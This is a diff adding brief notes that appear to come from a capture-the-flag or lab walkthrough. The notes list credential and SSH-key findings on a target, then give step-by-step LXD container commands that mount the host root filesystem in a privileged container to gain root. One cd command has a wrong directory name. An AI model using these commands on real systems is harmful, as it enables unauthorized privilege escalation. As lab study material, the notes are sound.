@@ -1,0 +1,16 @@
+Found username in source code of homepage
+Found password list in /uploads
+Found ssh key in /secret
+Found priv esc through lxd
+
+git clone https://github.com/saghul/lxd-alpine-builder.git
+cd lxd-alpine-builder.git
+./build-alpine
+
+Transferred image to /tmp on target and build it
+lxc image import alpine-v3.12-x86_64-20201211_1547.tar.gz --alias myimage
+lxc image list
+lxc init myimage ignite -c security.privileged=true
+lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+lxc start ignite
+lxc exec ignite /bin/sh
